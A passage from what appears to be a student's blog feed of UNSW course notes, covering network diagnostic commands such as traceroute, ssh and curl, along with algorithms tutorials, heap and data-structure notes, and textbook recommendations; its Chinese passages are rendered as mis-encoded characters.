2600:9000:2215:9a00:17:876d:b540:93a1Name:    d2l3pjybjlbg0l.cloudfront.netAddress: 2600:9000:2215:e000:17:876d:b540:93a1</code></pre><p>nslookup 129.94.208.2 æ˜¯åå‘æŸ¥è¯¢ï¼ˆReverse DNS Lookupï¼‰ï¼Œå³ä» IP åœ°å€æŸ¥è¯¢å¯¹åº”çš„ä¸»æœºåï¼ˆPTR è®°å½•ï¼‰ã€‚</p><p>è¿”å›çš„ç»“æœ bartok.orchestra.cse.unsw.EDU.AU. æ˜¯ 129.94.208.2 è¿™ä¸ª IP åœ°å€çš„ä¸»æœºåï¼Œè¯´æ˜è¿™ä¸ª IP æœ‰ä¸€ä¸ª PTR è®°å½•æŒ‡å‘ bartok.orchestra.cse.unsw.EDU.AU.ã€‚</p><p>2.208.94.129.in-addr.arpa  å‰é¢ipä¸ºå•¥æ˜¯åçš„ï¼Œåé¢å­—ç¬¦ä¸²æ˜¯å•¥</p><p>è¿™æ˜¯å› ä¸º DNS åå‘è§£æï¼ˆReverse DNS Lookupï¼‰ ä½¿ç”¨äº†ä¸€ç§ç‰¹æ®Šçš„åŸŸåæ ¼å¼ï¼Œç§°ä¸º PTR è®°å½•ï¼ˆPointer Recordï¼‰ï¼Œå®ƒç”¨äºå°† IP åœ°å€æ˜ å°„å›ä¸»æœºåã€‚</p><p>æ­£å¸¸çš„ IP åœ°å€</p><p>129.94.208.2</p><p>åå‘è§£æçš„æ ¼å¼</p><p>2.208.94.129.in-addr.arpa</p><p>IP åœ°å€çš„å„ä¸ªå…«ä½ç»„ï¼ˆoctetï¼‰è¢«å€’åºæ’åˆ—ï¼Œç„¶åæ·»åŠ  .in-addr.arpa è¿™ä¸ªåç¼€ã€‚</p><p>DNS è§£ææ˜¯å±‚çº§ç»“æ„çš„ï¼Œä»å³åˆ°å·¦è§£æï¼š</p><p>æ­£å‘æŸ¥è¯¢æ—¶ï¼ŒåŸŸåå±‚çº§æ˜¯ ä»å³åˆ°å·¦ï¼š</p><p>www.google.com</p><p>è§£ææ—¶ï¼ŒDNS æœåŠ¡å™¨å…ˆæŸ¥ .com é¡¶çº§åŸŸåï¼Œå†æŸ¥ google.comï¼Œæœ€åæŸ¥ www.google.comã€‚</p><p>åå‘æŸ¥è¯¢æ—¶ï¼ŒIP åœ°å€çš„å±‚çº§æ˜¯ ä»å·¦åˆ°å³ï¼š</p><p>129.94.208.2</p><p>129 æ˜¯ A ç±»åœ°å€çš„ç½‘ç»œå·ï¼Œæœ€å·¦è¾¹çš„éƒ¨åˆ†æœ€é‡è¦ã€‚</p><p>ä½† DNS è§£ææ˜¯ä»å³åˆ°å·¦ï¼Œæ‰€ä»¥åå‘è§£ææ—¶ï¼Œéœ€è¦å€’åºæ’åˆ— IP åœ°å€çš„å…«ä½ç»„ã€‚</p><p>PTR è®°å½•ï¼ˆPointer Recordï¼‰è¯¦è§£</p><p>ä»€ä¹ˆæ˜¯ PTR è®°å½•ï¼Ÿ</p><p>PTRï¼ˆPointer Recordï¼‰è®°å½•æ˜¯ DNS åå‘è§£æï¼ˆReverse DNS Lookupï¼‰ ä¸­çš„ä¸€ç§ DNS è®°å½•ç±»å‹ï¼Œå®ƒç”¨äºå°† IP åœ°å€æ˜ å°„å›åŸŸåã€‚</p><p>æ­£å‘è§£æï¼ˆA è®°å½•ï¼‰ï¼šæŠŠ åŸŸåè§£æä¸º IP</p><p>ä¾‹å¦‚ï¼š</p><p>example.com -&gt; 93.184.216.34</p><p>åå‘è§£æï¼ˆPTR è®°å½•ï¼‰ï¼šæŠŠ IP è§£æä¸ºåŸŸå<br>ä¾‹å¦‚ï¼š</p><p>93.184.216.34 -&gt; example.com</p><h1 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h1><p>The <strong>traceroute</strong> utility traces an IP packetâ€™s route from your host to another Internet host. It shows how a host is physically connected to the Internet. Along the way, it gives an understanding of how networks interconnect. This network utility can also measure the round trip time between your host and the intermediate routers along the path.</p><p>The traceroute command is used to discover the routes packets take when travelling to their destination. The device (for example, a router or a PC) sends a sequence of User Datagram Protocol (UDP) datagrams to an invalid port address at the remote host. The default IP probe packet, which encapsulates the UDP datagram, is 40 bytes long.</p><p>Three UDP datagrams are sent, each with a Time-To-Live (TTL) field value set to one. The TTL value of 1 causes the datagram to â€œtimeoutâ€ as soon as it hits the first router in the path; this router then responds with an ICMP Time Exceeded Message (TEM) indicating that the datagram has expired.</p><p>Another three UDP messages are now sent, each with the TTL value set to 2, which causes the second router to return ICMP TEMs. This process continues until the packets reach the destination. Since these datagrams are trying to access an invalid port at the destination host, ICMP Port Unreachable Messages are returned, indicating an unreachable port; this event signals the Traceroute program is finished.</p><p>The purpose is to record the source of each ICMP Time Exceeded Message to trace the path the packet took to reach the destination.</p><h2 id="å‘½ä»¤å†…å®¹è¯¦è§£"><a href="#å‘½ä»¤å†…å®¹è¯¦è§£" class="headerlink" title="å‘½ä»¤å†…å®¹è¯¦è§£"></a>å‘½ä»¤å†…å®¹è¯¦è§£</h2><p>traceroute host</p><pre><code>z5541664@vx14:~/Desktop$ traceroute www.telstra.com.autraceroute to www.telstra.com.au (18.67.110.86), 30 hops max, 60 byte packets 1  cserouter1-server.orchestra.cse.unsw.EDU.AU (129.94.242.251)  0.077 ms  0.084 ms  0.070 ms 2  unsw-gateway.orchestra.cse.unsw.EDU.AU (129.94.39.17)  0.477 ms  0.492 ms  0.490 ms 3  172.17.47.2 (172.17.47.2)  1.806 ms  1.472 ms  1.443 ms 4  172.17.17.9 (172.17.17.9)  0.923 ms 172.17.17.45 (172.17.17.45)  0.702 ms 172.17.17.9 (172.17.17.9)  1.243 ms 5  138.44.18.70 (138.44.18.70)  0.997 ms  1.222 ms 172.17.17.33 (172.17.17.33)  0.828 ms 6  ae2.bdr1.msc4.nsw.aarnet.net.au (113.197.15.77)  1.067 ms 138.44.18.70 (138.44.18.70)  0.973 ms ae2.bdr1.msc4.nsw.aarnet.net.au (113.197.15.77)  1.048 ms 7  * ae2.bdr1.msc4.nsw.aarnet.net.au (113.197.15.77)  1.971 ms * 8  * * * 9  * * *10  * * *11  * * *12  * * *13  15.230.149.4 (15.230.149.4)  1.679 ms  1.493 ms  1.467 ms14  * 15.230.149.5 (15.230.149.5)  1.658 ms  1.666 ms15  * * *16  * * *17  * * *18  * * *19  * * *20  * * *21  * * *22  * * *23  * * *24  * * *25  * * *26  * * *27  * * *28  * * *29  * * *30  * * *</code></pre><p><code>30 hops max, 60 byte packets</code>åœ¨è¯´æ¢æµ‹æœ€å¤§30è·³ï¼Œæ¯ä¸ªåŒ…æºå¸¦60å­—èŠ‚ã€‚</p><p>Hops çš„è‹±æ–‡å…¨ç§°æ˜¯ â€œHop Countâ€ï¼Œå…¶ä¸­ Hop æŒ‡çš„æ˜¯æ•°æ®åŒ…åœ¨ç½‘ç»œä¸­ç»è¿‡çš„ä¸€ä¸ªè·¯ç”±å™¨ï¼Œè€Œ Hop Count æŒ‡çš„æ˜¯æ•°æ®åŒ…ä»æºå¤´åˆ°ç›®çš„åœ°æ‰€ç»è¿‡çš„è·¯ç”±è·³æ•°ã€‚</p><p>åœ¨ traceroute ç»“æœä¸­ï¼Œæ¯ä¸€è¡Œçš„æ•°å­—ï¼ˆå¦‚ 7ï¼‰è¡¨ç¤ºå½“å‰æ•°æ®åŒ…ç»è¿‡çš„ ç¬¬å‡ è·³ï¼ˆhopï¼‰ã€‚</p><p>æ¯è¡Œçš„<code>* * *</code>è¡¨ç¤ºæ¯ä¸ªhopä¼šå‘é€3ä¸ªæ¢æµ‹åŒ…ï¼Œå‘é€æ–¹åªéœ€è¦è®¾ç½®TTLå¤šå°‘è·³ï¼Œç„¶åç­‰unreachableçš„å“åº”ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æ¢æµ‹åˆ°ï¼Œè·³è¿™ä¹ˆå‡ ä¸‹ï¼Œèƒ½è®¿é—®åˆ°çš„<strong>è·¯ç”±æ¥å£</strong>å¤§æ¦‚æœ‰å“ªäº›ã€‚</p><p>æ³¨æ„ï¼Œè·¯ç”±æ¥å£ä¸æ˜¯è·¯ç”±å™¨ï¼Œä½ å¯ä»¥ç†è§£æˆå’Œè·¯ç”±å™¨ä¸Šçš„å¤šç½‘å¡ç›¸å…³ï¼Œä½†æ˜¯è¿™ä¸æ˜¯æˆ‘ä»¬å…³å¿ƒçš„ã€‚tracerouterå¹¶ä¸è¿”å›å…·ä½“çš„å“ªä¸ªè·¯ç”±ï¼Œè¾¨åˆ«ä¸äº†ï¼Œä½†æ˜¯ä¼šè¿”å›è·¯ç”±æ¥å£ã€‚</p><p>ä¸ºä»€ä¹ˆä¼šå‡ºç° *ï¼Ÿ</p><p>åœ¨ traceroute ç»“æœä¸­ï¼Œæ¯ä¸€è¡Œçš„æ ¼å¼æ˜¯ï¼š</p><pre><code>è·³æ•°  å“åº”æ—¶é—´1  å“åº”æ—¶é—´2  å“åº”æ—¶é—´3è·³æ•°  *  å“åº”æ—¶é—´  *</code></pre><p><code>*</code> è¡¨ç¤ºè¯¥æ¢æµ‹åŒ… æ²¡æœ‰æ”¶åˆ° ICMP å“åº”ï¼Œå¯èƒ½çš„åŸå› åŒ…æ‹¬ï¼š</p><pre><code>è¯¥è·¯ç”±å™¨ä¸¢å¼ƒ ICMP è¶…æ—¶ï¼ˆTTL exceededï¼‰æ¶ˆæ¯å¯èƒ½æ˜¯é˜²ç«å¢™ç­–ç•¥ä¸å…è®¸è¿”å› ICMP Time Exceededã€‚è´Ÿè½½å‡è¡¡æˆ–ä¸åŒè·¯å¾„å¯èƒ½ traceroute çš„ä¸‰ä¸ªæ¢æµ‹åŒ…èµ°äº†ä¸åŒè·¯å¾„ï¼Œå…¶ä¸­æœ‰çš„è·¯å¾„ä¸è¿”å›å“åº”ã€‚ICMP é€Ÿç‡é™åˆ¶è¯¥è·¯ç”±å™¨å¯èƒ½è®¾ç½®äº†ICMP å“åº”é¢‘ç‡é™åˆ¶ï¼Œæœ‰æ—¶ä¼šè¿”å›ï¼Œæœ‰æ—¶ä¸ä¼šã€‚</code></pre><p>7  <em> ae2.bdr1.msc4.nsw.aarnet.net.au (113.197.15.77)  1.971 ms </em></p><p><em>ï¼ˆç¬¬ä¸€ä¸ªæ¢æµ‹åŒ…ï¼‰ï¼šæ²¡æœ‰æ”¶åˆ°è¯¥è·¯ç”±å™¨çš„ ICMP å“åº”ï¼ˆå¯èƒ½æ˜¯é˜²ç«å¢™æˆ– ICMP é™åˆ¶ï¼‰ã€‚<br>1.971 msï¼ˆç¬¬äºŒä¸ªæ¢æµ‹åŒ…ï¼‰ï¼šæˆåŠŸæ”¶åˆ° ICMP å“åº”ã€‚</em>ï¼ˆç¬¬ä¸‰ä¸ªæ¢æµ‹åŒ…ï¼‰ï¼šåŒæ ·æ²¡æœ‰æ”¶åˆ° ICMP å“åº”ã€‚</p><h1 id="telnet-obsolete"><a href="#telnet-obsolete" class="headerlink" title="telnet (obsolete)"></a>telnet (obsolete)</h1><p>The <strong>telnet</strong> utility connects one host to another (remote login) via the Internet. This command allows you to log onto machines worldwide that you have accounts on or that allow public access. The most common way to use the command is:</p><pre><code>telnet host [port]</code></pre><p>port indicates a port number (address of an application); if it is not specified, the default telnet port is used.</p><p>After issuing the <strong>telnet</strong> command, you will receive a login prompt for the host system. You may now log in to the host system. When you are finished with your remote session, log out as usual. Telnet is inherently insecure and is often disabled on most hosts.</p><h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><p>SSH is a set of standards and an associated network protocol that allows for establishing a secure channel between a local and a remote computer. The SSH client - <strong>ssh</strong> - that supports terminal protocols is typically used to administer the SSH server computer remotely via the terminal console. Thus, it is used as an alternative to telnet . The most common way to use the command is:</p><pre><code>ssh -l username hostname</code></pre><p>or</p><pre><code>ssh username@hostname</code></pre><p>After issuing the ssh command, if the remote computer authenticates you successfully, you will receive a login prompt for the remote machine. You may now log in to the host system. When you are finished with your remote session, log out as usual.</p><h1 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h1><p>The <strong>ifconfig</strong> utility is used to assign an address to a network interface and to configure or display the current network interface configuration information. It must be used at system startup to define the network address of each interface present on a machine. After system startup, it can redefine an interfaceâ€™s address and other operating parameters. If a single interface argument is given, it displays the status of the given interface only; if a single -a argument is given, it shows the status of all interfaces. Otherwise, it configures an interface.</p><p>Note: the directory /sbin is not the path of a typical user. So you may have to type /sbin/ifconfig</p><h1 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h1><p>The <strong>netstat</strong> utility allows the printing of various data related to the network configuration of a station. Here, we show only two forms of this command:</p><p>Option -i allows printing the state of the network interfaces (e.g. eth0 or lo).</p><p>The MTU and Met fields show the interfaceâ€™s current MTU and metric values. The RX and TX columns show the number of packets received or transmitted error-free (RX-OK/TX-OK) or damaged (RX-ERR/TX-ERR), dropped (RX-DRP/TX-DRP), and lost because of an overrun (RX-OVR/TX-OVR).</p><p>The last column shows the flags that have been set for this interface. These characters are one-character versions of the long flag names that are printed when you display the interface configuration with ifconfig :</p><h1 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h1><pre><code>curl www.example.com</code></pre><p>The command will show the response text of HTTP only. It wont show the request and response headers.</p><pre><code>curl -v www.example.com</code></pre><p>The command will show the response text of HTTP only. It also shows the request and response headers.</p><pre><code>curl -v www.example.com*   Trying 23.40.52.182:80...* Connected to www.example.com (23.40.52.182) port 80 (#0)&gt; GET / HTTP/1.1&gt; Host: www.example.com&gt; User-Agent: curl/7.88.1&gt; Accept: */*&gt; &lt; HTTP/1.1 200 OK&lt; Content-Type: text/html&lt; ETag: &quot;84238dfc8092e5d9c0dac8ef93371a07:1736799080.121134&quot;&lt; Last-Modified: Mon, 13 Jan 2025 20:11:20 GMT&lt; Cache-Control: max-age=3538&lt; Date: Sun, 02 Mar 2025 22:37:52 GMT&lt; Content-Length: 1256&lt; Connection: keep-alive&lt; &lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> COMP9331 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wk1-tut</title>
      <link href="/2025/02/21/COMP9101/wk1-tut/"/>
      <url>/2025/02/21/COMP9101/wk1-tut/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#2n-number-the-largest-number">2n number, the largest number</a></li><li><a href="#2n-number-the-two-largest-numbers">2^n number, the two largest numbers</a><ul><li><a href="#answer">Answer</a><ul><li><a href="#1-sequence-of-leaves-are-random-red-or-blue">1. sequence of leaves are random red or blue</a></li><li><a href="#2-if-two-two-red-and-blue-leaves">2. if two-two red and blue leaves</a></li></ul></li></ul></li><li><a href="#two-sum">two sum</a></li><li><a href="#three-sum">three sum</a></li><li><a href="#shortest-path">shortest path</a></li><li><a href="#birthday-in-a-list">Birthday in a list</a></li></ul><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-27-13-31-10.png" alt></p><h1 id="2n-number-the-largest-number"><a href="#2n-number-the-largest-number" class="headerlink" title="2n number, the largest number"></a>2n number, the largest number</h1><p>(a) Suppose that you have an array of $2n$ distinct integers. How can you find the smallest and largest integers using at most $3nâˆ’2$ comparisons?</p><p><strong>Note.</strong> Naively finding the smallest and largest integers will take $(2nâˆ’1)+(2n âˆ’ 2)=4nâˆ’3$ comparisons, which is too many.Try and eliminate some redundant comparisons.</p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-21-15-09-06.png" alt></p><hr><h1 id="2-n-number-the-two-largest-numbers"><a href="#2-n-number-the-two-largest-numbers" class="headerlink" title="2^n number, the two largest numbers"></a>2^n number, the two largest numbers</h1><p>(b) Now, suppose you have an array of $2^n$ distinct integers. How can you find the largest two integers using at most $2^n+nâˆ’2$ comparisons? </p><p><strong>Hint</strong>. Do something similar with a different data structure.</p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-21-15-09-26.png" alt></p><hr><p>You are handed a complete binary tree with $4^n$ leaves, each leaf coloured either blue or red. You play a game with your friend on the tree. To play the game, you and your friend place down $1 M on the root of the tree. You then take it in turns to move the money down the tree, to one of its children. The game ends when the money lands at one of the leaf vertices.</p><p>You win $2M if the coin lands at a leaf vertex coloured red, and lose $1 M if the coin lands at a leaf vertex coloured blue. You make the initial move so that your opponent makes the final move. Your task is to decide whether to play the game or not.</p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-21-15-39-42.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-21-15-44-01.png" alt></p><h2 id="Answer"><a href="#Answer" class="headerlink" title="Answer"></a>Answer</h2><h3 id="1-sequence-of-leaves-are-random-red-or-blue"><a href="#1-sequence-of-leaves-are-random-red-or-blue" class="headerlink" title="1. sequence of leaves are random red or blue"></a>1. sequence of leaves are random red or blue</h3><p>Normally, if the sequence of leaves are random red or blue, my friend always take the last step to the two children. Hence itâ€™s possible that he is always intended to choose the blue.</p><h3 id="2-if-two-two-red-and-blue-leaves"><a href="#2-if-two-two-red-and-blue-leaves" class="headerlink" title="2. if two-two red and blue leaves"></a>2. if two-two red and blue leaves</h3><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-21-36-24.png" alt></p><p>Just like this, if I could control the penultimate turn, I always control the flow into the node with two red leaves.</p><p>Then I always win!</p><hr><h1 id="two-sum"><a href="#two-sum" class="headerlink" title="two sum"></a>two sum</h1><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-21-47-03.png" alt></p><hr><h1 id="three-sum"><a href="#three-sum" class="headerlink" title="three sum"></a>three sum</h1><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-21-47-10.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-26-12-02-55.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-26-12-03-01.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-26-12-03-27.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-26-12-06-49.png" alt></p><p>The minimum time complexity is $O(n^2)$</p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-26-12-44-08.png" alt></p><hr><h1 id="shortest-path"><a href="#shortest-path" class="headerlink" title="shortest path"></a>shortest path</h1><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-22-04-09.png" alt></p><hr><h1 id="Birthday-in-a-list"><a href="#Birthday-in-a-list" class="headerlink" title="Birthday in a list"></a>Birthday in a list</h1><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-21-54-23.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-22-01-10.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-22-01-16.png" alt></p><p><img src="/2025/02/21/COMP9101/wk1-tut/2025-02-25-22-01-37.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> COMP9101 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>merge sort</title>
      <link href="/2025/02/21/Algorithm/merge-sort/"/>
      <url>/2025/02/21/Algorithm/merge-sort/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1em1oYTEFf">bilibili merge sort</a></p><p><img src="/2025/02/21/Algorithm/merge-sort/2025-02-21-14-29-47.png" alt></p><p><img src="/2025/02/21/Algorithm/merge-sort/2025-02-21-14-32-08.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Data Structures</title>
      <link href="/2025/02/21/Algorithm/Data-Structures/"/>
      <url>/2025/02/21/Algorithm/Data-Structures/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#basic-data-structure">Basic data structure</a><ul><li><a href="#arrays">Arrays</a></li><li><a href="#linked-lists">Linked lists</a></li><li><a href="#stacks">Stacks</a></li><li><a href="#queues">Queues</a></li><li><a href="#heaps">Heaps</a><ul><li><a href="#heap-features">heap features</a></li><li><a href="#full-binary-tree">Full Binary Tree</a></li><li><a href="#perfect-binary-tree">Perfect Binary Tree</a></li><li><a href="#complete-binary-tree">Complete Binary Tree</a></li><li><a href="#time-complexity">time complexity</a></li><li><a href="#reference">reference</a></li></ul></li><li><a href="#hash-tables">Hash tables</a></li></ul></li></ul><h1 id="Basic-data-structure"><a href="#Basic-data-structure" class="headerlink" title="Basic data structure"></a>Basic data structure</h1><h3 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h3><ul><li>Stores $n$ items, indexed from $1$ to $n$.</li><li>Accessing an element has time complexity $O(1)$; insertion and deletion has time complexity $O(n)$; search has time complexity $O(n)$.</li></ul><h3 id="Linked-lists"><a href="#Linked-lists" class="headerlink" title="Linked lists"></a>Linked lists</h3><ul><li>Stores items in a list where each element has a link to the next element.</li><li>Accessing an element has time complexity $O(n)$; insertion and deletion has time complexity $O(1)$; search has time complexity $O(n)$.</li></ul><h3 id="Stacks"><a href="#Stacks" class="headerlink" title="Stacks"></a>Stacks</h3><ul><li>Stores items in LIFO (last-in, first-out) order.</li><li>Accessing the top of the stack has time complexity $O(1)$; insertion and deletion has time complexity $O(1)$ but we can only insert or delete from the top of the stack.</li></ul><h3 id="Queues"><a href="#Queues" class="headerlink" title="Queues"></a>Queues</h3><ul><li>Stores items in FIFO (first-in, first-out) order.</li><li>Accessing the front of the queue has time complexity $O(1)$; insertion and deletion has time complexity $O(1)$ but we can only insert or delete from the front of the queue.</li></ul><h3 id="Heaps"><a href="#Heaps" class="headerlink" title="Heaps"></a>Heaps</h3><ul><li><p>Stores items in a <strong>complete binary tree</strong> (<em>Notely <code>complete binart tree</code>â€˜s definition, just all full nodes except the lowest layer, and only adjacent lacks on right side</em> <a href="https://zh.wikipedia.org/zh-cn/%E4%BA%8C%E5%8F%89%E6%A0%91#%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91">å®Œå…¨äºŒå‰æ ‘</a>). Minimum heaps ensure that every parent node is $â‰¤$ all of its children nodes. Maximum heaps ensure that every parent node is $â‰¥$ all of its children nodes.</p></li><li><p>Searching for the min/max has time complexity $O(1)$; insertion has time complexity $O(log n)$; deleting the min/max has time complexity $O(log n)$.</p></li></ul><p>We know for a perfect, how to infer its depth by the number of nodes: $H = log_2(N+1)$. Heapify up or down is mainly according to its depth, hence eventually the insertion and deleting for a heap (complete binary tree) is $O(log n)$.</p><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-12-47-55.png" alt></p><p>When you want to populate a number, please refer to <a href="https://gallery.selfboot.cn/zh/algorithms/heap">visually observe heap</a>. The inserted number will always enter <strong>at the position of complete tree the lowest leftest position</strong>, then follow which type of the heap (<strong>Max heap</strong> or <strong>Min heap</strong>), adjust its position on the chain.</p><h4 id="heap-features"><a href="#heap-features" class="headerlink" title="heap features"></a>heap features</h4><p>For example, if I want to insert a new 22, at first it will be inserted here.</p><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-12-58-07.png" alt></p><p>Then followed by the chain, the new number 22 would be adjusted to the position, which is greater than its child and smaller then its parent (<strong>heapify-up</strong> or <strong>heapify-down</strong>).</p><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-12-59-33.png" alt></p><h4 id="Full-Binary-Tree"><a href="#Full-Binary-Tree" class="headerlink" title="Full Binary Tree"></a>Full Binary Tree</h4><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-13-22-07.png" alt></p><p>Every has either two or zero children.</p><h4 id="Perfect-Binary-Tree"><a href="#Perfect-Binary-Tree" class="headerlink" title="Perfect Binary Tree"></a>Perfect Binary Tree</h4><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-13-22-40.png" alt></p><p>A tree has $k$ layers, and $2^k - 1$ nodes.</p><p>A tree with only the root node is also a perfect binary tree.</p><p>Assume depth is H</p><p>Nodes: $2^H-1$</p><p>leaves: $2^{H-1}$</p><p>$i$ layer nodes: $2^{i-1}$</p><p>infer depth by nodes: $H = log_2(N+1)$</p><h4 id="Complete-Binary-Tree"><a href="#Complete-Binary-Tree" class="headerlink" title="Complete Binary Tree"></a>Complete Binary Tree</h4><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-13-23-03.png" alt></p><p>All internal nodes have 2 children, and all leaves are on the same layer.</p><h4 id="time-complexity"><a href="#time-complexity" class="headerlink" title="time complexity"></a>time complexity</h4><ol><li>Searching for the min/max has time complexity $O(1)$</li></ol><p>Obviously, a Max Heapâ€™s root is the Maxmium, and a Min Heapâ€™s root is the Minium. Just find the root node, hence itâ€™s $O(1)$</p><ol><li>insertion has time complexity $O(logn)$; deleting the min/max has time complexity $O(log n)$.</li></ol><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://en.wikipedia.org/wiki/Heap_(data_structure">wikipedia</a>)</p><p><a href="https://www.youtube.com/watch?v=0wPlzMU-k00">youtube heap in 3 minutes</a></p><p><a href="https://zh.wikipedia.org/zh-cn/%E4%BA%8C%E5%8F%89%E6%A0%91#%E5%AE%8C%E5%85%A8%E4%BA%8C%E5%8F%89%E6%A0%91">å®Œå…¨äºŒå‰æ ‘</a></p><p><a href="https://gallery.selfboot.cn/zh/algorithms/heap">visually observe heap</a></p><h3 id="Hash-tables"><a href="#Hash-tables" class="headerlink" title="Hash tables"></a>Hash tables</h3><ul><li>Stores values indexed by keys. A hash function maps keys to indices in a fixed-size table.</li><li><strong>Worst case</strong>. Searching for an element given the key has time complexity $O(n)$; insertion and deletion has time complexity $O(n)$.</li><li><strong>Expected case</strong>. Searching for an element given the key has time complexity $O(1)$; insertion and deletion has time complexity $O(1)$.</li></ul><p><a href="https://en.wikipedia.org/wiki/Hash_table">wiki hash table</a></p><p><img src="/2025/02/21/Algorithm/Data-Structures/2025-02-21-13-52-30.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>recommanded_materials</title>
      <link href="/2025/02/21/COMP9101/recommanded-materials/"/>
      <url>/2025/02/21/COMP9101/recommanded-materials/</url>
      
        <content type="html"><![CDATA[<p>Liam Heng:</p><p>Self-plagiarising my response from last term:</p><p>There are always other resources if youâ€™d like to read more on top of this as well:</p><p><a href="https://jeffe.cs.illinois.edu/teaching/algorithms/notes/98-induction.pdf">https://jeffe.cs.illinois.edu/teaching/algorithms/notes/98-induction.pdf</a></p><p><a href="https://cseweb.ucsd.edu/classes/sp05/cse101/JeffEdmondsBook.pdf">https://cseweb.ucsd.edu/classes/sp05/cse101/JeffEdmondsBook.pdf</a></p><p><a href="https://users.metu.edu.tr/serge/courses/111-2011/textbook-math111.pdf">https://users.metu.edu.tr/serge/courses/111-2011/textbook-math111.pdf</a></p><p>in addition to the listed textbooks on the Course Outline (CLRS and Kleinberg/Tardos).</p><p>Most of the textbooks have a soft copy that you can find online for free; I would only recommend buying it if you prefer a hard copy of the book or if you plan to do further algorithms study in the future. In saying that, Kleinberg and Tardosâ€™s Algorithm Design (KT) and Ericksonâ€™s Algorithms books are quite beginner-friendly so they are good for when you are starting out in algorithms. They explain a lot of the concepts in greater depth and expand on a lot of the topics that we do in this course, so if you have an interest in learning about the field, they are good resources. They would also serve as good supplementary texts to the course.</p><p>Cormen, Leiserson, Rivest, Stein (CLRS) is a very comprehensive textbook and most experts in the field use it as the â€œreference guideâ€. But I would only recommend it after you take an algorithms course since it is quite dense and can be quite jarring to read.</p><p>Other books I would recommend are:</p><p>Tim Roughgardenâ€™s Algorithm Illuminated. This is the book used in Stanfordâ€™s Algorithms course; there are also bite-sized videos offered by the author that you can find on YouTube. They cover most of the course and serve as good complementary videos in case anything you find in the course a bit hard to digest.</p><p>Steven Skienaâ€™s Algorithm Design Manual. This is written in a very conversational manner, so itâ€™s good if youâ€™re looking for a more informal introduction to algorithms. It can be good for leetcode preparation since it goes through common pitfalls of problem solving as well as how you can recover from it.</p><p>Hopefully, a subset of these textbooks can serve as good supplements. They arenâ€™t too bad of a read, so if you can spare a few nights or so, experiment with it and see what clicks for you!</p>]]></content>
      
      
      <categories>
          
          <category> COMP9101 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>wk1-lec</title>
      <link href="/2025/02/19/COMP9101/wk1-lec/"/>
      <url>/2025/02/19/COMP9101/wk1-lec/</url>
      
        <content type="html"><![CDATA[<p>Extracted from the raw material from UNSW COMP9101, thanks for Serge Gaspers.</p><ul><li><a href="#lec">Lec</a></li><li><a href="#why-should-you-study-algorithms">Why should you study algorithms?</a><ul><li><a href="#two-pillars">Two pillars</a><ul><li><a href="#1-algorithm-design">1. algorithm design</a></li><li><a href="#2-algorithm-analysis">2. algorithm analysis</a></li></ul></li></ul></li><li><a href="#algorithm-analysis-why-is-correctness-important">Algorithm analysis: why is correctness important?</a></li><li><a href="#algorithm-analysis-why-is-efficiency-important">Algorithm analysis: why is efficiency important?</a></li><li><a href="#why-is-algorithm-design-important">Why is algorithm design important?</a></li><li><a href="#code-first-approach">Code-first approach</a></li><li><a href="#separating-design-from-implementation">Separating design from implementation</a></li><li><a href="#course-learning-outcomes">Course Learning Outcomes</a></li><li><a href="#what-is-an-algorithm">What is an algorithm?</a></li><li><a href="#scope">Scope</a></li><li><a href="#problem-structure">Problem structure</a></li><li><a href="#example-problem-geese-in-a-trenchcoat">Example problem: Geese in a Trenchcoat</a><ul><li><a href="#problem">Problem</a></li><li><a href="#abstraction">Abstraction</a></li><li><a href="#example-problem-geese-in-a-trenchcoat-1">Example problem: Geese in a Trenchcoat</a><ul><li><a href="#attempt-1">Attempt 1</a></li><li><a 